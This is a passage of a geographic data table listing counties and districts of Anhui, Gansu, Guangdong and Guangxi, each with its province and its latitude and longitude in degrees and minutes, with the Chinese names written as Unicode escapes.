["\u5B89\u5FBD\u7701", "\u6DA1\u9633\u53BF", "33", "31", "116", "13"], ["\u5B89\u5FBD\u7701", "\u4E34\u6CC9\u53BF", "33", "4", "115", "15"], ["\u5B89\u5FBD\u7701", "\u6FC9\u6EAA\u53BF", "33", "55", "116", "46"], ["\u5B89\u5FBD\u7701", "\u8427\u53BF", "34", "11", "116", "56"], ["\u5B89\u5FBD\u7701", "\u7800\u5C71\u53BF", "34", "25", "116", "21"], ["\u5B89\u5FBD\u7701", "\u56FA\u9547\u53BF", "33", "19", "117", "19"], ["\u5B89\u5FBD\u7701", "\u7075\u74A7\u53BF", "33", "33", "117", "33"], ["\u5B89\u5FBD\u7701", "\u6000\u8FDC\u53BF", "32", "58", "117", "11"], ["\u5B89\u5FBD\u7701", "\u8499\u57CE\u53BF", "33", "16", "116", "34"], ["\u5B89\u5FBD\u7701", "\u51E4\u53F0\u53BF", "32", "42", "116", "43"], ["\u5B89\u5FBD\u7701", "\u5BFF\u53BF", "32", "35", "116", "47"], ["\u5B89\u5FBD\u7701", "\u51E4\u9633\u53BF", "32", "52", "117", "34"], ["\u5B89\u5FBD\u7701", "\u957F\u4E30\u53BF", "32", "29", "117", "10"], ["\u5B89\u5FBD\u7701", "\u5B9A\u8FDC\u53BF", "32", "32", "117", "40"], ["\u5B89\u5FBD\u7701", "\u6765\u5B89\u53BF", "32", "27", "118", "26"], ["\u5B89\u5FBD\u7701", "\u4E94\u6CB3\u53BF", "33", "9", "117", "53"], ["\u5B89\u5FBD\u7701", "\u6CD7\u53BF", "33", "29", "117", "53"], ["\u5B89\u5FBD\u7701", "\u5E7F\u5FB7\u53BF", "30", "54", "119", "25"], ["\u5B89\u5FBD\u7701", "\u90CE\u6EAA\u53BF", "31", "8", "119", "10"], ["\u5B89\u5FBD\u7701", "\u5F53\u6D82\u53BF", "31", "33", "118", "29"], ["\u5B89\u5FBD\u7701", "\u548C\u53BF", "31", "43", "118", "22"], ["\u5B89\u5FBD\u7701", "\u5168\u6912\u53BF", "32", "6", "118", "16"], ["\u5B89\u5FBD\u7701", "\u542B\u5C71\u53BF", "31", "43", "118", "6"], ["\u5B89\u5FBD\u7701", "\u65E0\u4E3A\u53BF", "31", "18", "117", "55"], ["\u5B89\u5FBD\u7701", "\u94DC\u9675\u53BF", "30", "57", "117", "47"], ["\u5B89\u5FBD\u7701", "\u7E41\u660C\u53BF", "31", "5", "118", "12"], ["\u5B89\u5FBD\u7701", "\u5357\u9675\u53BF", "30", "55", "118", "20"], ["\u5B89\u5FBD\u7701", "\u829C\u6E56\u53BF", "31", "9", "118", "34"], ["\u5B89\u5FBD\u7701", "\u65CC\u5FB7\u53BF", "30", "17", "118", "32"], ["\u5B89\u5FBD\u7701", "\u6CFE\u53BF", "30", "42", "118", "24"], ["\u5B89\u5FBD\u7701", "\u9752\u9633\u53BF", "30", "39", "117", "51"], ["\u5B89\u5FBD\u7701", "\u4F11\u5B81\u53BF", "29", "47", "118", "11"], ["\u5B89\u5FBD\u7701", "\u7941\u95E8\u53BF", "29", "52", "117", "43"], ["\u5B89\u5FBD\u7701", "\u9EDF\u53BF", "29", "56", "117", "56"], ["\u5B89\u5FBD\u7701", "\u6B59\u53BF", "29", "52", "118", "26"], ["\u5B89\u5FBD\u7701", "\u7EE9\u6EAA\u53BF", "30", "4", "118", "36"], ["\u7518\u8083\u7701", "\u5170\u5DDE\u5E02", "36", "4", "103", "49"], ["\u7518\u8083\u7701", "\u7518\u5357\u85CF\u65CF\u81EA\u6CBB\u5DDE", "34", "59", "102", "55"], ["\u7518\u8083\u7701", "\u4E34\u590F\u56DE\u65CF\u81EA\u6CBB\u5DDE", "35", "36", "103", "13"], ["\u7518\u8083\u7701", "\u6B66\u5A01\u5E02", "37", "56", "102", "38"], ["\u7518\u8083\u7701", "\u5609\u5CEA\u5173\u5E02", "39", "48", "98", "16"], ["\u7518\u8083\u7701", "\u9152\u6CC9\u5E02", "39", "45", "98", "31"], ["\u7518\u8083\u7701", "\u5F20\u6396\u5E02", "38", "56", "100", "27"], ["\u7518\u8083\u7701", "\u91D1\u660C\u5E02", "38", "30", "102", "11"], ["\u7518\u8083\u7701", "\u5E86\u9633\u5E02", "35", "44", "107", "38"], ["\u7518\u8083\u7701", "\u5E73\u51C9\u5E02", "35", "33", "106", "40"], ["\u7518\u8083\u7701", "\u767D\u94F6\u5E02", "36", "33", "104", "11"], ["\u7518\u8083\u7701", "\u5B9A\u897F\u5E02", "35", "35", "104", "37"], ["\u7518\u8083\u7701", "\u5929\u6C34\u5E02", "34", "35", "105", "43"], ["\u7518\u8083\u7701", "\u9647\u5357\u5E02", "33", "24", "104", "55"], ["\u7518\u8083\u7701", "\u8083\u5DDE\u533A", "39", "45", "98", "31"], ["\u7518\u8083\u7701", "\u7518\u5DDE\u533A", "38", "56", "100", "27"], ["\u7518\u8083\u7701", "\u91D1\u5DDD\u533A", "38", "30", "102", "11"], ["\u7518\u8083\u7701", "\u57CE\u5173\u533A", "36", "3", "103", "50"], ["\u7518\u8083\u7701", "\u897F\u56FA\u533A", "36", "6", "103", "37"], ["\u7518\u8083\u7701", "\u7EA2\u53E4\u533A", "36", "20", "102", "52"], ["\u7518\u8083\u7701", "\u51C9\u5DDE\u533A", "37", "56", "102", "38"], ["\u7518\u8083\u7701", "\u767D\u94F6\u533A", "36", "33", "104", "11"], ["\u7518\u8083\u7701", "\u5E73\u5DDD\u533A", "36", "44", "104", "50"], ["\u7518\u8083\u7701", "\u5D06\u5CD2\u533A", "35", "33", "106", "40"], ["\u7518\u8083\u7701", "\u897F\u5CF0\u533A", "35", "44", "107", "38"], ["\u7518\u8083\u7701", "\u5B89\u5B9A\u533A", "35", "35", "104", "37"], ["\u7518\u8083\u7701", "\u9EA6\u79EF\u533A", "34", "34", "105", "53"], ["\u7518\u8083\u7701", "\u6B66\u90FD\u533A", "33", "24", "104", "55"], ["\u7518\u8083\u7701", "\u5408\u4F5C\u5E02", "34", "59", "102", "55"], ["\u7518\u8083\u7701", "\u4E34\u590F\u5E02", "35", "36", "103", "13"], ["\u7518\u8083\u7701", "\u7389\u95E8\u5E02", "40", "17", "97", "3"], ["\u7518\u8083\u7701", "\u6566\u714C\u5E02", "40", "8", "94", "40"], ["\u7518\u8083\u7701", "\u79E6\u5DDE\u533A", "34", "35", "105", "43"], ["\u7518\u8083\u7701", "\u739B\u66F2\u53BF", "33", "60", "102", "4"], ["\u7518\u8083\u7701", "\u788C\u66F2\u53BF", "34", "35", "102", "29"], ["\u7518\u8083\u7701", "\u8FED\u90E8\u53BF", "34", "3", "103", "13"], ["\u7518\u8083\u7701", "\u5353\u5C3C\u53BF", "34", "35", "103", "30"], ["\u7518\u8083\u7701", "\u4E34\u6F6D\u53BF", "34", "42", "103", "21"], ["\u7518\u8083\u7701", "\u5E7F\u6CB3\u53BF", "35", "29", "103", "35"], ["\u7518\u8083\u7701", "\u4E34\u590F\u53BF", "35", "30", "102", "60"], ["\u7518\u8083\u7701", "\u548C\u653F\u53BF", "35", "26", "103", "21"], ["\u7518\u8083\u7701", "\u590F\u6CB3\u53BF", "35", "12", "102", "31"], ["\u7518\u8083\u7701", "\u79EF\u77F3\u5C71\u4FDD\u5B89\u65CF\u4E1C\u4E61\u65CF\u6492\u62C9\u65CF\u81EA\u6CBB\u53BF", "35", "43", "102", "53"], ["\u7518\u8083\u7701", "\u4E1C\u4E61\u65CF\u81EA\u6CBB\u53BF", "35", "40", "103", "24"], ["\u7518\u8083\u7701", "\u6C38\u9756\u53BF", "35", "56", "103", "19"], ["\u7518\u8083\u7701", "\u6C38\u767B\u53BF", "36", "44", "103", "16"], ["\u7518\u8083\u7701", "\u53E4\u6D6A\u53BF", "37", "28", "102", "53"], ["\u7518\u8083\u7701", "\u5929\u795D\u85CF\u65CF\u81EA\u6CBB\u53BF", "36", "59", "103", "8"], ["\u7518\u8083\u7701", "\u91D1\u5854\u53BF", "39", "59", "98", "54"], ["\u7518\u8083\u7701", "\u4E34\u6CFD\u53BF", "39", "8", "100", "10"], ["\u7518\u8083\u7701", "\u9AD8\u53F0\u53BF", "39", "23", "99", "49"], ["\u7518\u8083\u7701", "\u8083\u5357\u88D5\u56FA\u65CF\u81EA\u6CBB\u53BF", "38", "50", "99", "37"], ["\u7518\u8083\u7701", "\u6C11\u4E50\u53BF", "38", "26", "100", "49"], ["\u7518\u8083\u7701", "\u5C71\u4E39\u53BF", "38", "47", "101", "5"], ["\u7518\u8083\u7701", "\u6C38\u660C\u53BF", "38", "15", "101", "58"], ["\u7518\u8083\u7701", "\u6C11\u52E4\u53BF", "38", "37", "103", "5"], ["\u7518\u8083\u7701", "\u74DC\u5DDE\u53BF", "40", "32", "95", "50"], ["\u7518\u8083\u7701", "\u963F\u514B\u585E\u54C8\u8428\u514B\u65CF\u81EA\u6CBB\u53BF", "39", "38", "94", "20"], ["\u7518\u8083\u7701", "\u8083\u5317\u8499\u53E4\u65CF\u81EA\u6CBB\u53BF", "39", "31", "94", "53"], ["\u7518\u8083\u7701", "\u6B63\u5B81\u53BF", "35", "30", "108", "22"], ["\u7518\u8083\u7701", "\u5B81\u53BF", "35", "30", "107", "55"], ["\u7518\u8083\u7701", "\u5408\u6C34\u53BF", "35", "49", "108", "1"], ["\u7518\u8083\u7701", "\u5E86\u57CE\u53BF", "35", "60", "107", "53"], ["\u7518\u8083\u7701", "\u534E\u6C60\u53BF", "36", "28", "107", "59"], ["\u7518\u8083\u7701", "\u73AF\u53BF", "36", "35", "107", "18"], ["\u7518\u8083\u7701", "\u9547\u539F\u53BF", "35", "41", "107", "12"], ["\u7518\u8083\u7701", "\u666F\u6CF0\u53BF", "37", "9", "104", "4"], ["\u7518\u8083\u7701", "\u9756\u8FDC\u53BF", "36", "34", "104", "41"], ["\u7518\u8083\u7701", "\u768B\u5170\u53BF", "36", "20", "103", "57"], ["\u7518\u8083\u7701", "\u6986\u4E2D\u53BF", "35", "51", "104", "7"], ["\u7518\u8083\u7701", "\u4F1A\u5B81\u53BF", "35", "42", "105", "3"], ["\u7518\u8083\u7701", "\u9759\u5B81\u53BF", "35", "31", "105", "43"], ["\u7518\u8083\u7701", "\u5E84\u6D6A\u53BF", "35", "12", "106", "3"], ["\u7518\u8083\u7701", "\u5F20\u5BB6\u5DDD\u56DE\u65CF\u81EA\u6CBB\u53BF", "34", "60", "106", "13"], ["\u7518\u8083\u7701", "\u6E05\u6C34\u53BF", "34", "45", "106", "8"], ["\u7518\u8083\u7701", "\u897F\u548C\u53BF", "34", "1", "105", "18"], ["\u7518\u8083\u7701", "\u793C\u53BF", "34", "11", "105", "10"], ["\u7518\u8083\u7701", "\u7518\u8C37\u53BF", "34", "44", "105", "20"], ["\u7518\u8083\u7701", "\u6B66\u5C71\u53BF", "34", "43", "104", "53"], ["\u7518\u8083\u7701", "\u901A\u6E2D\u53BF", "35", "12", "105", "15"], ["\u7518\u8083\u7701", "\u79E6\u5B89\u53BF", "34", "52", "105", "40"], ["\u7518\u8083\u7701", "\u9647\u897F\u53BF", "35", "0", "104", "38"], ["\u7518\u8083\u7701", "\u6F33\u53BF", "34", "51", "104", "28"], ["\u7518\u8083\u7701", "\u4E34\u6D2E\u53BF", "35", "23", "103", "52"], ["\u7518\u8083\u7701", "\u5EB7\u4E50\u53BF", "35", "22", "103", "43"], ["\u7518\u8083\u7701", "\u6E2D\u6E90\u53BF", "35", "8", "104", "13"], ["\u7518\u8083\u7701", "\u5CB7\u53BF", "34", "26", "104", "2"], ["\u7518\u8083\u7701", "\u5B95\u660C\u53BF", "34", "3", "104", "23"], ["\u7518\u8083\u7701", "\u821F\u66F2\u53BF", "33", "47", "104", "22"], ["\u7518\u8083\u7701", "\u6587\u53BF", "32", "57", "104", "41"], ["\u7518\u8083\u7701", "\u4E24\u5F53\u53BF", "33", "55", "106", "18"], ["\u7518\u8083\u7701", "\u5EB7\u53BF", "33", "20", "105", "36"], ["\u7518\u8083\u7701", "\u5D07\u4FE1\u53BF", "35", "18", "107", "2"], ["\u7518\u8083\u7701", "\u7075\u53F0\u53BF", "35", "4", "107", "37"], ["\u7518\u8083\u7701", "\u5FBD\u53BF", "33", "46", "106", "5"], ["\u7518\u8083\u7701", "\u6210\u53BF", "33", "44", "105", "43"], ["\u7518\u8083\u7701", "\u6CFE\u5DDD\u53BF", "35", "20", "107", "22"], ["\u7518\u8083\u7701", "\u534E\u4EAD\u53BF", "35", "13", "106", "39"], ["\u5E7F\u4E1C\u7701", "\u5E7F\u5DDE\u5E02", "23", "8", "113", "16"], ["\u5E7F\u4E1C\u7701", "\u6E5B\u6C5F\u5E02", "21", "16", "110", "21"], ["\u5E7F\u4E1C\u7701", "\u8302\u540D\u5E02", "21", "40", "110", "55"], ["\u5E7F\u4E1C\u7701", "\u9633\u6C5F\u5E02", "21", "52", "111", "59"], ["\u5E7F\u4E1C\u7701", "\u6DF1\u5733\u5E02", "22", "33", "114", "3"], ["\u5E7F\u4E1C\u7701", "\u4E2D\u5C71\u5E02", "22", "31", "113", "23"], ["\u5E7F\u4E1C\u7701", "\u73E0\u6D77\u5E02", "22", "16", "113", "34"], ["\u5E7F\u4E1C\u7701", "\u6C5F\u95E8\u5E02", "22", "35", "113", "5"], ["\u5E7F\u4E1C\u7701", "\u8087\u5E86\u5E02", "23", "3", "112", "28"], ["\u5E7F\u4E1C\u7701", "\u4F5B\u5C71\u5E02", "23", "1", "113", "7"], ["\u5E7F\u4E1C\u7701", "\u6E05\u8FDC\u5E02", "23", "42", "113", "2"], ["\u5E7F\u4E1C\u7701", "\u4E1C\u839E\u5E02", "23", "3", "113", "45"], ["\u5E7F\u4E1C\u7701", "\u60E0\u5DDE\u5E02", "23", "7", "114", "25"], ["\u5E7F\u4E1C\u7701", "\u6CB3\u6E90\u5E02", "23", "44", "114", "42"], ["\u5E7F\u4E1C\u7701", "\u97F6\u5173\u5E02", "24", "49", "113", "36"], ["\u5E7F\u4E1C\u7701", "\u4E91\u6D6E\u5E02", "22", "55", "112", "2"], ["\u5E7F\u4E1C\u7701", "\u6F6E\u5DDE\u5E02", "23", "40", "116", "37"], ["\u5E7F\u4E1C\u7701", "\u6885\u5DDE\u5E02", "24", "17", "116", "7"], ["\u5E7F\u4E1C\u7701", "\u63ED\u9633\u5E02", "23", "33", "116", "22"], ["\u5E7F\u4E1C\u7701", "\u6C55\u5934\u5E02", "23", "21", "116", "41"], ["\u5E7F\u4E1C\u7701", "\u6C55\u5C3E\u5E02", "22", "47", "115", "22"], ["\u5E7F\u4E1C\u7701", "\u7AEF\u5DDE\u533A", "23", "3", "112", "29"], ["\u5E7F\u4E1C\u7701", "\u9F0E\u6E56\u533A", "23", "10", "112", "34"], ["\u5E7F\u4E1C\u7701", "\u60E0\u57CE\u533A", "23", "5", "114", "24"], ["\u5E7F\u4E1C\u7701", "\u60E0\u9633\u533A", "22", "48", "114", "28"], ["\u5E7F\u4E1C\u7701", "\u5357\u5C71\u533A", "22", "31", "113", "55"], ["\u5E7F\u4E1C\u7701", "\u5B9D\u5B89\u533A", "22", "34", "113", "54"], ["\u5E7F\u4E1C\u7701", "\u798F\u7530\u533A", "22", "32", "114", "3"], ["\u5E7F\u4E1C\u7701", "\u7F57\u6E56\u533A", "22", "33", "114", "7"], ["\u5E7F\u4E1C\u7701", "\u76D0\u7530\u533A", "22", "33", "114", "13"], ["\u5E7F\u4E1C\u7701", "\u9F99\u5C97\u533A", "22", "44", "114", "16"], ["\u5E7F\u4E1C\u7701", "\u589E\u57CE\u5E02", "23", "18", "113", "50"], ["\u5E7F\u4E1C\u7701", "\u4ECE\u5316\u5E02", "23", "33", "113", "35"], ["\u5E7F\u4E1C\u7701", "\u6597\u95E8\u533A", "22", "13", "113", "17"], ["\u5E7F\u4E1C\u7701", "\u91D1\u6E7E\u533A", "22", "4", "113", "24"], ["\u5E7F\u4E1C\u7701", "\u9999\u6D32\u533A", "22", "16", "113", "33"], ["\u5E7F\u4E1C\u7701", "\u5357\u6D77\u533A", "23", "2", "113", "9"], ["\u5E7F\u4E1C\u7701", "\u987A\u5FB7\u533A", "22", "48", "113", "18"], ["\u5E7F\u4E1C\u7701", "\u4E09\u6C34\u533A", "23", "10", "112", "52"], ["\u5E7F\u4E1C\u7701", "\u9AD8\u660E\u533A", "22", "54", "112", "53"], ["\u5E7F\u4E1C\u7701", "\u65B0\u4F1A\u533A", "22", "28", "113", "2"], ["\u5E7F\u4E1C\u7701", "\u6C5F\u57CE\u533A", "21", "52", "111", "57"], ["\u5E7F\u4E1C\u7701", "\u4E91\u57CE\u533A", "22", "56", "112", "2"], ["\u5E7F\u4E1C\u7701", "\u8302\u6E2F\u533A", "21", "28", "111", "1"], ["\u5E7F\u4E1C\u7701", "\u8302\u5357\u533A", "21", "38", "110", "55"], ["\u5E7F\u4E1C\u7701", "\u9EBB\u7AE0\u533A", "21", "16", "110", "19"], ["\u5E7F\u4E1C\u7701", "\u5761\u5934\u533A", "21", "14", "110", "28"], ["\u5E7F\u4E1C\u7701", "\u971E\u5C71\u533A", "21", "12", "110", "24"], ["\u5E7F\u4E1C\u7701", "\u8D64\u574E\u533A", "21", "16", "110", "22"], ["\u5E7F\u4E1C\u7701", "\u5434\u5DDD\u5E02", "21", "26", "110", "46"], ["\u5E7F\u4E1C\u7701", "\u96F7\u5DDE\u5E02", "20", "55", "110", "5"], ["\u5E7F\u4E1C\u7701", "\u5EC9\u6C5F\u5E02", "21", "37", "110", "16"], ["\u5E7F\u4E1C\u7701", "\u4FE1\u5B9C\u5E02", "22", "21", "110", "57"], ["\u5E7F\u4E1C\u7701", "\u9AD8\u5DDE\u5E02", "21", "55", "110", "51"], ["\u5E7F\u4E1C\u7701", "\u5316\u5DDE\u5E02", "21", "40", "110", "38"], ["\u5E7F\u4E1C\u7701", "\u7F57\u5B9A\u5E02", "22", "46", "111", "34"], ["\u5E7F\u4E1C\u7701", "\u6069\u5E73\u5E02", "22", "11", "112", "18"], ["\u5E7F\u4E1C\u7701", "\u9633\u6625\u5E02", "22", "11", "111", "47"], ["\u5E7F\u4E1C\u7701", "\u5F00\u5E73\u5E02", "22", "23", "112", "40"], ["\u5E7F\u4E1C\u7701", "\u53F0\u5C71\u5E02", "22", "15", "112", "47"], ["\u5E7F\u4E1C\u7701", "\u9E64\u5C71\u5E02", "22", "46", "112", "58"], ["\u5E7F\u4E1C\u7701", "\u9AD8\u8981\u5E02", "23", "2", "112", "27"], ["\u5E7F\u4E1C\u7701", "\u56DB\u4F1A\u5E02", "23", "20", "112", "41"], ["\u5E7F\u4E1C\u7701", "\u82F1\u5FB7\u5E02", "24", "11", "113", "24"], ["\u5E7F\u4E1C\u7701", "\u5357\u96C4\u5E02", "25", "7", "114", "18"], ["\u5E7F\u4E1C\u7701", "\u4E50\u660C\u5E02", "25", "8", "113", "21"], ["\u5E7F\u4E1C\u7701", "\u8FDE\u5DDE\u5E02", "24", "47", "112", "23"], ["\u5E7F\u4E1C\u7701", "\u5174\u5B81\u5E02", "24", "9", "115", "44"], ["\u5E7F\u4E1C\u7701", "\u9646\u4E30\u5E02", "22", "57", "115", "39"], ["\u5E7F\u4E1C\u7701", "\u666E\u5B81\u5E02", "23", "18", "116", "11"], ["\u5E7F\u4E1C\u7701", "\u6E05\u57CE\u533A", "23", "42", "113", "1"], ["\u5E7F\u4E1C\u7701", "\u66F2\u6C5F\u533A", "24", "41", "113", "36"], ["\u5E7F\u4E1C\u7701", "\u6D48\u6C5F\u533A", "24", "48", "113", "36"], ["\u5E7F\u4E1C\u7701", "\u6B66\u6C5F\u533A", "24", "48", "113", "34"], ["\u5E7F\u4E1C\u7701", "\u6E90\u57CE\u533A", "23", "44", "114", "42"], ["\u5E7F\u4E1C\u7701", "\u6885\u6C5F\u533A", "24", "19", "116", "7"], ["\u5E7F\u4E1C\u7701", "\u6E58\u6865\u533A", "23", "41", "116", "38"], ["\u5E7F\u4E1C\u7701", "\u9976\u5E73\u53BF", "23", "40", "116", "60"], ["\u5E7F\u4E1C\u7701", "\u6F84\u6D77\u533A", "23", "29", "116", "46"], ["\u5E7F\u4E1C\u7701", "\u91D1\u5E73\u533A", "23", "22", "116", "42"], ["\u5E7F\u4E1C\u7701", "\u9F99\u6E56\u533A", "23", "22", "116", "43"], ["\u5E7F\u4E1C\u7701", "\u8FBE\u6FE0\u533A", "23", "17", "116", "44"], ["\u5E7F\u4E1C\u7701", "\u6F6E\u9633\u533A", "23", "16", "116", "36"], ["\u5E7F\u4E1C\u7701", "\u6F6E\u5357\u533A", "23", "15", "116", "26"], ["\u5E7F\u4E1C\u7701", "\u5F90\u95FB\u53BF", "20", "20", "110", "10"], ["\u5E7F\u4E1C\u7701", "\u9042\u6EAA\u53BF", "21", "23", "110", "15"], ["\u5E7F\u4E1C\u7701", "\u7535\u767D\u53BF", "21", "30", "111", "0"], ["\u5E7F\u4E1C\u7701", "\u9633\u897F\u53BF", "21", "45", "111", "37"], ["\u5E7F\u4E1C\u7701", "\u65B0\u5174\u53BF", "22", "42", "112", "14"], ["\u5E7F\u4E1C\u7701", "\u9633\u4E1C\u53BF", "21", "53", "112", "1"], ["\u5E7F\u4E1C\u7701", "\u5357\u6C99\u533A", "22", "48", "113", "30"], ["\u5E7F\u4E1C\u7701", "\u5E7F\u5B81\u53BF", "23", "38", "112", "26"], ["\u5E7F\u4E1C\u7701", "\u6E05\u65B0\u53BF", "23", "44", "112", "59"], ["\u5E7F\u4E1C\u7701", "\u4F5B\u5188\u53BF", "23", "53", "113", "32"], ["\u5E7F\u4E1C\u7701", "\u82B1\u90FD\u533A", "23", "24", "113", "13"], ["\u5E7F\u4E1C\u7701", "\u9EC4\u57D4\u533A", "23", "6", "113", "27"], ["\u5E7F\u4E1C\u7701", "\u5929\u6CB3\u533A", "23", "7", "113", "21"], ["\u5E7F\u4E1C\u7701", "\u6D77\u73E0\u533A", "23", "6", "113", "15"], ["\u5E7F\u4E1C\u7701", "\u8354\u6E7E\u533A", "23", "8", "113", "14"], ["\u5E7F\u4E1C\u7701", "\u8D8A\u79C0\u533A", "23", "8", "113", "16"], ["\u5E7F\u4E1C\u7701", "\u767D\u4E91\u533A", "23", "10", "113", "16"], ["\u5E7F\u4E1C\u7701", "\u756A\u79BA\u533A", "22", "57", "113", "21"], ["\u5E7F\u4E1C\u7701", "\u841D\u5C97\u533A", "23", "11", "113", "30"], ["\u5E7F\u4E1C\u7701", "\u535A\u7F57\u53BF", "23", "11", "114", "17"], ["\u5E7F\u4E1C\u7701", "\u60E0\u4E1C\u53BF", "22", "59", "114", "43"], ["\u5E7F\u4E1C\u7701", "\u7D2B\u91D1\u53BF", "23", "38", "115", "11"], ["\u5E7F\u4E1C\u7701", "\u4E1C\u6E90\u53BF", "23", "49", "114", "46"], ["\u5E7F\u4E1C\u7701", "\u65B0\u4E30\u53BF", "24", "4", "114", "12"], ["\u5E7F\u4E1C\u7701", "\u9F99\u95E8\u53BF", "23", "44", "114", "15"], ["\u5E7F\u4E1C\u7701", "\u7FC1\u6E90\u53BF", "24", "21", "114", "8"], ["\u5E7F\u4E1C\u7701", "\u59CB\u5174\u53BF", "24", "57", "114", "4"], ["\u5E7F\u4E1C\u7701", "\u8FDE\u5E73\u53BF", "24", "22", "114", "29"], ["\u5E7F\u4E1C\u7701", "\u548C\u5E73\u53BF", "24", "27", "114", "56"], ["\u5E7F\u4E1C\u7701", "\u4EC1\u5316\u53BF", "25", "5", "113", "45"], ["\u5E7F\u4E1C\u7701", "\u4E73\u6E90\u7476\u65CF\u81EA\u6CBB\u53BF", "24", "47", "113", "16"], ["\u5E7F\u4E1C\u7701", "\u9633\u5C71\u53BF", "24", "29", "112", "38"], ["\u5E7F\u4E1C\u7701", "\u8FDE\u5357\u7476\u65CF\u81EA\u6CBB\u53BF", "24", "43", "112", "17"], ["\u5E7F\u4E1C\u7701", "\u8FDE\u5C71\u58EE\u65CF\u7476\u65CF\u81EA\u6CBB\u53BF", "24", "34", "112", "5"], ["\u5E7F\u4E1C\u7701", "\u6000\u96C6\u53BF", "23", "55", "112", "11"], ["\u5E7F\u4E1C\u7701", "\u4E91\u5B89\u53BF", "23", "5", "112", "0"], ["\u5E7F\u4E1C\u7701", "\u5FB7\u5E86\u53BF", "23", "9", "111", "46"], ["\u5E7F\u4E1C\u7701", "\u5C01\u5F00\u53BF", "23", "26", "111", "30"], ["\u5E7F\u4E1C\u7701", "\u90C1\u5357\u53BF", "23", "14", "111", "32"], ["\u5E7F\u4E1C\u7701", "\u5927\u57D4\u53BF", "24", "21", "116", "42"], ["\u5E7F\u4E1C\u7701", "\u5E73\u8FDC\u53BF", "24", "34", "115", "53"], ["\u5E7F\u4E1C\u7701", "\u8549\u5CAD\u53BF", "24", "40", "116", "10"], ["\u5E7F\u4E1C\u7701", "\u4E30\u987A\u53BF", "23", "46", "116", "11"], ["\u5E7F\u4E1C\u7701", "\u6885\u53BF", "24", "17", "116", "3"], ["\u5E7F\u4E1C\u7701", "\u9F99\u5DDD\u53BF", "24", "6", "115", "15"], ["\u5E7F\u4E1C\u7701", "\u4E94\u534E\u53BF", "23", "56", "115", "46"], ["\u5E7F\u4E1C\u7701", "\u9646\u6CB3\u53BF", "23", "18", "115", "39"], ["\u5E7F\u4E1C\u7701", "\u63ED\u897F\u53BF", "23", "26", "115", "50"], ["\u5E7F\u4E1C\u7701", "\u6D77\u4E30\u53BF", "22", "58", "115", "20"], ["\u5E7F\u4E1C\u7701", "\u60E0\u6765\u53BF", "23", "2", "116", "17"], ["\u5E7F\u4E1C\u7701", "\u63ED\u4E1C\u53BF", "23", "34", "116", "25"], ["\u5E7F\u4E1C\u7701", "\u5357\u6FB3\u53BF", "23", "25", "117", "1"], ["\u5E7F\u4E1C\u7701", "\u6F6E\u5B89\u53BF", "23", "27", "116", "41"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5357\u5B81\u5E02", "22", "49", "108", "22"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9632\u57CE\u6E2F\u5E02", "21", "42", "108", "21"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5317\u6D77\u5E02", "21", "29", "109", "7"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u94A6\u5DDE\u5E02", "21", "57", "108", "37"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u8D35\u6E2F\u5E02", "23", "6", "109", "36"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5D07\u5DE6\u5E02", "22", "24", "107", "22"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6CB3\u6C60\u5E02", "24", "42", "108", "4"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6765\u5BBE\u5E02", "23", "44", "109", "14"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u67F3\u5DDE\u5E02", "24", "20", "109", "25"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u767E\u8272\u5E02", "23", "54", "106", "37"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6842\u6797\u5E02", "25", "17", "110", "17"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u68A7\u5DDE\u5E02", "23", "29", "111", "16"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u8D3A\u5DDE\u5E02", "24", "25", "111", "33"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u7389\u6797\u5E02", "22", "38", "110", "10"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u91D1\u57CE\u6C5F\u533A", "24", "42", "108", "3"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9095\u5B81\u533A", "22", "45", "108", "29"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u826F\u5E86\u533A", "22", "46", "108", "19"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u5174\u5B81\u533A", "22", "52", "108", "23"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6C5F\u5357\u533A", "22", "47", "108", "17"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u897F\u4E61\u5858\u533A", "22", "50", "108", "18"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u67F3\u5357\u533A", "24", "21", "109", "23"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u8983\u5858\u533A", "23", "8", "109", "25"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6E2F\u5357\u533A", "23", "5", "109", "36"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u94C1\u5C71\u6E2F\u533A", "21", "32", "109", "26"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u94A6\u5317\u533A", "21", "59", "108", "38"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u9632\u57CE\u533A", "21", "46", "108", "21"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u6E2F\u53E3\u533A", "21", "39", "108", "22"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u51ED\u7965\u5E02", "22", "7", "106", "45"], ["\u5E7F\u897F\u58EE\u65CF\u81EA\u6CBB\u533A", "\u4E1C\u5174\u5E02", "21", "32", "107", "58"], 